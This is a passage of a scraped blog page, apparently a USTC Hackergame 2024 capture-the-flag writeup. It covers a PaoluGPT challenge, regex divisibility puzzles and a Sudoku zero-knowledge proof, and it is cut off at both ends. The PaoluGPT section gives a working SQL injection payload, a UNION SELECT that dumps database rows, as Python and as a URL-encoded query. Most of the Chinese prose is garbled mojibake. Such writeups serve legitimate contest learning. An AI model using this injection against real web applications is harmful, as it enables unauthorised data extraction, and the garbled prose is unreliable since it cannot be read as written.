return True row, col = empty for num in range(1, 10): if is_safe(grid, row, col, num): grid[row][col] = num if solve_sudoku(grid): return True grid[row][col] = 0 return False def find_empty(grid): \"\"\"Find empty cell in grid\"\"\" for i in range(9): for j in range(9): if grid[i][j] == 0: return (i, j) return None def create_input_files(puzzle_json, output_input=\"input.json\", output_public=\"public.json\"): \"\"\"Create input.json and public.json from puzzle JSON\"\"\" # Load puzzle if isinstance(puzzle_json, str): with open(puzzle_json) as f: data = json.load(f) puzzle = data['puzzle'] else: puzzle = puzzle_json['puzzle'] # Convert to 2D and solve grid = convert_1d_to_2d(puzzle) solution = [row[:] for row in grid] # Create a copy print(\"Original puzzle:\") print_grid(grid) if solve_sudoku(solution): print(\"\\nSolution found:\") print_grid(solution) # Create input.json input_data = { \"unsolved_grid\": grid, \"solved_grid\": solution } with open(output_input, 'w') as f: json.dump(input_data, f) # Create public.json public_data = { \"public\": [str(x) for x in puzzle] } with open(output_public, 'w') as f: json.dump(public_data, f) print(\"\\nCreated input.json and public.json successfully!\") else: print(\"No solution exists!\") # Example usage: puzzle = { \"puzzle\": [ 9,0,0,0,0,0,1,0,0, 8,0,0,0,0,0,2,0,0, 7,0,0,0,0,0,3,0,0, 0,0,1,0,0,0,0,0,6, 0,2,0,0,0,0,0,7,0, 0,0,3,0,0,0,0,0,0, 0,1,0,0,0,0,0,6,0, 0,0,2,0,0,0,0,0,7, 0,3,0,0,0,0,0,0,0, ], \"difficulty\": \"expert\" } create_input_files(puzzle) ç„¶åç”¨è§£ç å¥½çš„æ•°ç‹¬ç­”æ¡ˆç”Ÿæˆè¯æ˜å³å¯ï¼š\n./circom-macos-amd64 sudoku.circom --r1cs --wasm --sym node sudoku_js/generate_witness.js sudoku.wasm input.json witness.wtns snarkjs groth16 prove sudoku.zkey witness.wtns proof.json public.json snarkjs groth16 verify verification_key.json public.json proof.json å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„ LLM é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±ï¼Œå‘ç° Hackergame å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ï¼Œä»¥åŠã€Œè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—ğŸ¤£ã€ ã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯ flag ä¸€å®šè¦çŸ­ç‚¹ã€ å¾ˆæç¬‘çš„æ˜¯ï¼Œè¿™é“é¢˜å¯ä»¥æ‹¿å±è”½åçš„å­—ç¬¦é—®LLMï¼ŒLLMç«Ÿç„¶ä¸€æ¬¡ç»™å‡ºäº†æ­£ç¡®çš„ç­”æ¡ˆï¼š\nIn the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun. P.S (å°è¯•ç”¨LLM Zero-shotå®Œæˆhackergame) LLMçš„æ€§èƒ½åœ¨è¿™ä¸€å¹´æœ‰äº†å¾ˆå¤§çš„è¿›æ­¥ã€‚ç»è¿‡æµ‹è¯•ï¼Œåœ¨ä¸åå¤è¯¢é—®LLMï¼Œè®©ä»–ä¿®æ”¹å›ç­”çš„æƒ…å†µä¸‹ï¼ŒLLMè‡³å°‘å¯ä»¥ä¸€æ¬¡åšå‡ºNode.js is Web Scale, PaoluGPT, æƒœå­—å¦‚é‡‘ 3.0(1), ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿(1,2,3), é›¶çŸ¥è¯†æ•°ç‹¬(1,2)ï¼ŒåŠ èµ·æ¥å·²ç»æœ‰1600åˆ†äº†ã€‚\n","wordCount":"8072","inLanguage":"zh","image":"https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/score.png","datePublished":"2024-11-14T18:00:00Z","dateModified":"2024-11-15T22:52:25+08:00","author":{"@type":"Person","name":"sparktour"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/"},"publisher":{"@type":"Organization","name":"Sparktour's Blog","logo":{"@type":"ImageObject","url":"https://blog.sparktour.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.sparktour.me/ accesskey=h title="Sparktour's Blog (Alt + H)">Sparktour's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://blog.sparktour.me/en/ title=English aria-label=English>English</a></li></ul></div></div><ul id=menu><li><a href=https://blog.sparktour.me/archives title=Archive><span>Archive</span></a></li><li><a href=https://blog.sparktour.me/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://blog.sparktour.me/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://blog.sparktour.me/about/ title=About><span>About</span></a></li><li><a href=https://blog.sparktour.me/friends/ title=Friends><span>Friends</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.sparktour.me/>ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href=https://blog.sparktour.me/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">USTC Hackergame 2024 Writeup</h1><div class=post-meta><span title='2024-11-14 18:00:00 +0000 UTC'>2024-11-14</span>&nbsp;Â·&nbsp;<span title='2024-11-15 22:52:25 +0800 +0800'>æ›´æ–°äº: 2024-11-15</span>&nbsp;Â·&nbsp;17 åˆ†é’Ÿ&nbsp;Â·&nbsp;sparktour</div></header><figure class=entry-cover><img loading=eager src=https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/score.png alt="hackergame score"><figcaption>hackergame score</figcaption></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>ç›®å½•</span></summary><div class=inner><ul><li><a href=#paolugpt aria-label=PaoluGPT>PaoluGPT</a></li><li><a href=#%e5%bc%ba%e5%a4%a7%e7%9a%84%e6%ad%a3%e5%88%99%e8%a1%a8%e8%be%be%e5%bc%8f aria-label=å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼>å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼</a><ul><li><a href=#mod16 aria-label=mod16>mod16</a></li><li><a href=#mod13 aria-label=mod13>mod13</a></li></ul></li><li><a href=#%e6%97%a0%e6%b3%95%e8%8e%b7%e5%be%97%e7%9a%84%e7%a7%98%e5%af%86 aria-label=æ— æ³•è·å¾—çš„ç§˜å¯†>æ— æ³•è·å¾—çš„ç§˜å¯†</a></li><li><a href=#docker-for-everyone-plus aria-label="Docker for Everyone Plus">Docker for Everyone Plus</a><ul><li><a href=#no-enough-privilege aria-label="No Enough Privilege">No Enough Privilege</a></li></ul></li><li><a href=#zfs-%e6%96%87%e4%bb%b6%e6%81%a2%e5%a4%8d aria-label="ZFS æ–‡ä»¶æ¢å¤">ZFS æ–‡ä»¶æ¢å¤</a><ul><li><a href=#text-file aria-label="Text File">Text File</a></li><li><a href=#shell-script aria-label="Shell Script">Shell Script</a></li><li><a href=#ps aria-label=P.S>P.S</a><ul><li><a href=#%e5%8f%82%e8%80%83 aria-label=å‚è€ƒ>å‚è€ƒ</a></li></ul></li></ul></li><li><a href=#%e7%a6%81%e6%ad%a2%e5%86%85%e5%8d%b7 aria-label=ç¦æ­¢å†…å·>ç¦æ­¢å†…å·</a></li><li><a href=#%e4%b8%8d%e5%a4%aa%e5%88%86%e5%b8%83%e5%bc%8f%e7%9a%84%e8%bd%af%e6%80%bb%e7%ba%bf aria-label=ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿>ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿</a><ul><li><a href=#what-dbus-gonna-do aria-label="What DBus Gonna Do?">What DBus Gonna Do?</a></li><li><a href=#if-i-could-be-a-file-descriptor aria-label="If I Could Be A File Descriptor">If I Could Be A File Descriptor</a></li><li><a href=#comm-say-maybe aria-label="Comm Say Maybe">Comm Say Maybe</a></li></ul></li><li><a href=#%e5%85%b3%e7%81%af aria-label=å…³ç¯>å…³ç¯</a></li><li><a href=#%e9%9b%b6%e7%9f%a5%e8%af%86%e6%95%b0%e7%8b%ac aria-label=é›¶çŸ¥è¯†æ•°ç‹¬>é›¶çŸ¥è¯†æ•°ç‹¬</a><ul><li><a href=#%e6%95%b0%e7%8b%ac%e9%ab%98%e6%89%8b aria-label=æ•°ç‹¬é«˜æ‰‹>æ•°ç‹¬é«˜æ‰‹</a></li><li><a href=#zk%e9%ab%98%e6%89%8b aria-label=ZKé«˜æ‰‹>ZKé«˜æ‰‹</a></li></ul></li><li><a href=#%e5%85%88%e4%b8%8d%e8%af%b4%e5%85%b3%e4%ba%8e%e6%88%91%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%8b%ac%e8%87%aa%e5%9c%a8%e5%bc%82%e4%b8%96%e7%95%8c%e8%bd%ac%e7%94%9f%e6%88%90%e6%9f%90%e5%a4%a7%e5%8e%82%e5%ae%b6%e7%9a%84-llm-%e9%be%99%e7%8c%ab%e5%a5%b3%e4%bb%86%e8%bf%99%e4%bb%b6%e4%ba%8b%e5%8f%af%e4%b8%8d%e5%8f%af%e8%83%bd%e8%bf%99%e4%b9%88%e7%a6%bb%e8%b0%b1%e5%8f%91%e7%8e%b0-hackergame-%e5%86%85%e5%ae%b9%e5%ae%a1%e6%9f%a5%e5%a7%94%e5%91%98%e4%bc%9a%e5%bf%98%e8%ae%b0%e5%ae%a1%e6%9f%a5%e9%a2%98%e7%9b%ae%e6%a0%87%e9%a2%98%e4%ba%86%e3%81%94%e3%82%81%e3%82%93%e3%81%ad%e4%bb%a5%e5%8f%8a%e8%bf%99%e4%b9%88%e9%95%bf%e9%83%bd%e5%bf%ab%e8%b5%b6%e4%b8%8a%e8%bd%bb%e5%b0%8f%e8%af%b4%e4%ba%86%e7%9c%9f%e7%9a%84%e4%b8%8d%e4%bc%9a%e5%bd%b1%e5%93%8d%e7%94%a8%e6%88%b7%e4%bd%93%e9%aa%8c%e5%90%97 aria-label="å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„ LLM é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±ï¼Œå‘ç° Hackergame å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ï¼Œä»¥åŠã€Œè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—ğŸ¤£ã€">å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„ LLM é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±ï¼Œå‘ç° Hackergame å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ï¼Œä»¥åŠã€Œè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—ğŸ¤£ã€</a><ul><li><a href=#%e8%a1%8c%e5%90%a7%e5%b0%b1%e7%ae%97%e6%a0%87%e9%a2%98%e5%8f%af%e4%bb%a5%e5%be%88%e9%95%bf%e4%bd%86%e6%98%af-flag-%e4%b8%80%e5%ae%9a%e8%a6%81%e7%9f%ad%e7%82%b9 aria-label="ã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯ flag ä¸€å®šè¦çŸ­ç‚¹ã€">ã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯ flag ä¸€å®šè¦çŸ­ç‚¹ã€</a></li></ul></li><li><a href=#ps-%e5%b0%9d%e8%af%95%e7%94%a8llm-zero-shot%e5%ae%8c%e6%88%90hackergame aria-label="P.S (å°è¯•ç”¨LLM Zero-shotå®Œæˆhackergame)">P.S (å°è¯•ç”¨LLM Zero-shotå®Œæˆhackergame)</a></li></ul></div></details></div><div class=post-content><p>è¿™æ˜¯æœ¬äººç¬¬äº”æ¬¡å‚åŠ USTCçš„hackergameäº†ï¼Œæœ¬æ¬¡çš„æ’åç›¸æ¯”ä¸Šæ¬¡ç•¥æœ‰è¿›æ­¥ï¼Œè¿›åˆ°äº†50åå†…ã€‚</p><h2 id=paolugpt>PaoluGPT<a hidden class=anchor aria-hidden=true href=#paolugpt>#</a></h2><p>è§‚å¯Ÿä»£ç æ³¨æ„åˆ°äº†å¯èƒ½å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_search_payload</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># æ„é€ æœç´¢æ‰€æœ‰åŒ…å«flagè®°å½•çš„payload </span>
</span></span><span class=line><span class=cl>    <span class=c1># ä½¿ç”¨group_concatå°†å¤šæ¡è®°å½•åˆå¹¶,ç”¨æ¢è¡Œç¬¦åˆ†éš”</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;&#39; UNION SELECT &#39;Flags&#39;, group_concat(id || &#39; | &#39; || title || &#39; | &#39; || contents, char(10)) &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;FROM messages WHERE contents LIKE &#39;</span><span class=si>%f</span><span class=s2>lag%&#39; OR title LIKE &#39;</span><span class=si>%f</span><span class=s2>lag%&#39; -- &#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># URLç¼–ç </span>
</span></span><span class=line><span class=cl>    <span class=n>encoded_payload</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># æ„é€ å®Œæ•´URL</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;/view?conversation_id=</span><span class=si>{</span><span class=n>encoded_payload</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>url</span>
</span></span></code></pre></div><p>å¾—åˆ°äº†ä¸€ä¸ªå¦‚ä¸‹çš„queryï¼š</p><pre tabindex=0><code>/view?conversation_id=%27%20UNION%20SELECT%20%27Flags%27%2C%20group_concat%28id%20%7C%7C%20%27%20%7C%20%27%20%7C%7C%20title%20%7C%7C%20%27%20%7C%20%27%20%7C%7C%20contents%2C%20char%2810%29%29%20FROM%20messages%20WHERE%20contents%20LIKE%20%27%25flag%25%27%20OR%20title%20LIKE%20%27%25flag%25%27%20--%20
</code></pre><p>åœ¨æµè§ˆå™¨é‡Œç²˜è´´è¿›å»å¾—åˆ°çš„ç½‘é¡µé‡Œæœç´¢flagå°±èƒ½æ‰¾åˆ°ä¸¤ä¸ªå°é¢˜çš„flagäº†ã€‚</p><h2 id=å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼>å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼<a hidden class=anchor aria-hidden=true href=#å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼>#</a></h2><h3 id=mod16>mod16<a hidden class=anchor aria-hidden=true href=#mod16>#</a></h3><p>å‚è€ƒwikipediaçš„æ•´é™¤è§„åˆ™ï¼Œåšäº†ä¸€ä¸ªåŒ¹é…ï¼ˆåªåŒ¹é…äº†1ï¼Œ2ï¼Œ4ï¼Œè€ƒè™‘åˆ°éšæœºåˆ°å››ä½æ•°ä»¥ä¸‹çš„æ¦‚ç‡å¾ˆå°ï¼‰ï¼š</p><table><thead><tr><th>åƒä½æ•°æ˜¯å¶æ•°æ—¶ï¼Œæœ«ä¸‰ä½èƒ½è¢«16æ•´é™¤ã€‚</th><th>25ä¸‡4176ï¼šåƒä½æ•°4æ˜¯å¶æ•°ï¼Œæœ«ä¸‰ä½176ï¼Œèƒ½è¢«16æ•´é™¤ã€‚</th></tr></thead><tbody><tr><td>åƒä½æ•°æ˜¯å¥‡æ•°æ—¶ï¼Œæœ«ä¸‰ä½åŠ 8èƒ½è¢«16æ•´é™¤ã€‚</td><td>3408ï¼šåƒä½æ•°3æ˜¯å¥‡æ•°ï¼Œæœ«ä¸‰ä½408ï¼‹8ï¼416ï¼Œèƒ½è¢«16æ•´é™¤ã€‚</td></tr><tr><td>æœ«ä¸¤ä½ä¸å…¶ä½™ä½ä¹˜4ç›¸åŠ ï¼Œå…¶ç»“æœèƒ½è¢«16æ•´é™¤ã€‚</td><td>176ï¼š1Ã—4ï¼‹76ï¼80ï¼Œ1168ï¼š11Ã—4ï¼‹68ï¼112ï¼Œä¸¤è€…éƒ½èƒ½è¢«16æ•´é™¤ã€‚</td></tr><tr><td>æœ«å››ä½èƒ½è¢«16æ•´é™¤ã€‚</td><td>15ä¸‡7648ï¼šæœ«å››ä½7648èƒ½è¢«16æ•´é™¤ã€‚</td></tr></tbody></table><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/regex1.svg alt=æ­£åˆ™çš„ç®€åŒ–ç‰ˆæœ¬><figcaption>æ­£åˆ™çš„ç®€åŒ–ç‰ˆæœ¬</figcaption></figure></p><p>æœ€åä¼šå¾—åˆ°ä¸€ä¸ªå¾ˆé•¿çš„regexï¼ˆå› ä¸ºç©·ä¸¾äº†10000ä»¥å†…å¯ä»¥è¢«16æ•´é™¤çš„æ•°ï¼‰</p><pre tabindex=0><code>(0|1|2|3|4|5|6|7|8|9)*((0|2|4|6|8)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|(1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984)|0000|0016|0032|0048|0064|0080|0096|0112|0128|0144|0160|0176|0192|0208|0224|0240|0256|0272|0288|0304|0320|0336|0352|0368|0384|0400|0416|0432|0448|0464|0480|0496|0512|0528|0544|0560|0576|0592|0608|0624|0640|0656|0672|0688|0704|0720|0736|0752|0768|0784|0800|0816|0832|0848|0864|0880|0896|0912|0928|0944|0960|0976|0992|1008|1024|1040|1056|1072|1088|1104|1120|1136|1152|1168|1184|1200|1216|1232|1248|1264|1280|1296|1312|1328|1344|1360|1376|1392|1408|1424|1440|1456|1472|1488|1504|1520|1536|1552|1568|1584|1600|1616|1632|1648|1664|1680|1696|1712|1728|1744|1760|1776|1792|1808|1824|1840|1856|1872|1888|1904|1920|1936|1952|1968|1984|2000|2016|2032|2048|2064|2080|2096|2112|2128|2144|2160|2176|2192|2208|2224|2240|2256|2272|2288|2304|2320|2336|2352|2368|2384|2400|2416|2432|2448|2464|2480|2496|2512|2528|2544|2560|2576|2592|2608|2624|2640|2656|2672|2688|2704|2720|2736|2752|2768|2784|2800|2816|2832|2848|2864|2880|2896|2912|2928|2944|2960|2976|2992|3008|3024|3040|3056|3072|3088|3104|3120|3136|3152|3168|3184|3200|3216|3232|3248|3264|3280|3296|3312|3328|3344|3360|3376|3392|3408|3424|3440|3456|3472|3488|3504|3520|3536|3552|3568|3584|3600|3616|3632|3648|3664|3680|3696|3712|3728|3744|3760|3776|3792|3808|3824|3840|3856|3872|3888|3904|3920|3936|3952|3968|3984|4000|4016|4032|4048|4064|4080|4096|4112|4128|4144|4160|4176|4192|4208|4224|4240|4256|4272|4288|4304|4320|4336|4352|4368|4384|4400|4416|4432|4448|4464|4480|4496|4512|4528|4544|4560|4576|4592|4608|4624|4640|4656|4672|4688|4704|4720|4736|4752|4768|4784|4800|4816|4832|4848|4864|4880|4896|4912|4928|4944|4960|4976|4992|5008|5024|5040|5056|5072|5088|5104|5120|5136|5152|5168|5184|5200|5216|5232|5248|5264|5280|5296|5312|5328|5344|5360|5376|5392|5408|5424|5440|5456|5472|5488|5504|5520|5536|5552|5568|5584|5600|5616|5632|5648|5664|5680|5696|5712|5728|5744|5760|5776|5792|5808|5824|5840|5856|5872|5888|5904|5920|5936|5952|5968|5984|6000|6016|6032|6048|6064|6080|6096|6112|6128|6144|6160|6176|6192|6208|6224|6240|6256|6272|6288|6304|6320|6336|6352|6368|6384|6400|6416|6432|6448|6464|6480|6496|6512|6528|6544|6560|6576|6592|6608|6624|6640|6656|6672|6688|6704|6720|6736|6752|6768|6784|6800|6816|6832|6848|6864|6880|6896|6912|6928|6944|6960|6976|6992|7008|7024|7040|7056|7072|7088|7104|7120|7136|7152|7168|7184|7200|7216|7232|7248|7264|7280|7296|7312|7328|7344|7360|7376|7392|7408|7424|7440|7456|7472|7488|7504|7520|7536|7552|7568|7584|7600|7616|7632|7648|7664|7680|7696|7712|7728|7744|7760|7776|7792|7808|7824|7840|7856|7872|7888|7904|7920|7936|7952|7968|7984|8000|8016|8032|8048|8064|8080|8096|8112|8128|8144|8160|8176|8192|8208|8224|8240|8256|8272|8288|8304|8320|8336|8352|8368|8384|8400|8416|8432|8448|8464|8480|8496|8512|8528|8544|8560|8576|8592|8608|8624|8640|8656|8672|8688|8704|8720|8736|8752|8768|8784|8800|8816|8832|8848|8864|8880|8896|8912|8928|8944|8960|8976|8992|9008|9024|9040|9056|9072|9088|9104|9120|9136|9152|9168|9184|9200|9216|9232|9248|9264|9280|9296|9312|9328|9344|9360|9376|9392|9408|9424|9440|9456|9472|9488|9504|9520|9536|9552|9568|9584|9600|9616|9632|9648|9664|9680|9696|9712|9728|9744|9760|9776|9792|9808|9824|9840|9856|9872|9888|9904|9920|9936|9952|9968|9984)
</code></pre><h3 id=mod13>mod13<a hidden class=anchor aria-hidden=true href=#mod13>#</a></h3><p>åœ¨Stack Exchangeä¸Šæ‰¾åˆ°äº†è¿™ä¸ª<a href=https://codegolf.stackexchange.com/questions/3503/hard-code-golf-regex-for-divisibility-by-7/3580#3580>ç­”æ¡ˆ</a>ï¼Œå¹¶ä¸”å¾®è°ƒäº†ä¸€ä¸‹ï¼ŒæŠŠç”Ÿæˆçš„æ­£åˆ™é‡Œçš„<code>(0+)?</code>æ¢æˆäº†<code>0*</code>ä»¥æ»¡è¶³é¢˜ç›®çš„è¦æ±‚ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>gen</span><span class=p>(</span><span class=nx>b</span><span class=p>,</span> <span class=nx>base</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>states</span> <span class=o>=</span> <span class=nx>nfa</span><span class=p>(</span><span class=nx>b</span><span class=p>,</span> <span class=nx>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>states</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>states</span> <span class=o>=</span> <span class=nx>reduce</span><span class=p>(</span><span class=nx>states</span><span class=p>,</span> <span class=nx>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>states</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;phi&#39;</span> <span class=o>&amp;&amp;</span> <span class=k>new</span> <span class=nb>RegExp</span><span class=p>(</span><span class=s1>&#39;^&#39;</span> <span class=o>+</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span> <span class=o>+</span> <span class=s1>&#39;$&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>test</span><span class=p>(</span><span class=nx>reg</span><span class=p>,</span> <span class=nx>base</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>base</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>x</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>100</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>x</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>x</span><span class=p>.</span><span class=nx>map</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=p>{</span><span class=k>return</span> <span class=nx>a</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=nx>base</span><span class=p>)}).</span><span class=nx>filter</span><span class=p>(</span><span class=nx>reg</span><span class=p>.</span><span class=nx>test</span><span class=p>.</span><span class=nx>bind</span><span class=p>(</span><span class=nx>reg</span><span class=p>)).</span><span class=nx>map</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=p>{</span><span class=k>return</span> <span class=nb>parseInt</span><span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>base</span><span class=p>)})</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>nfa</span><span class=p>(</span><span class=nx>b</span><span class=p>,</span> <span class=nx>base</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>base</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>states</span> <span class=o>=</span> <span class=p>[];</span>
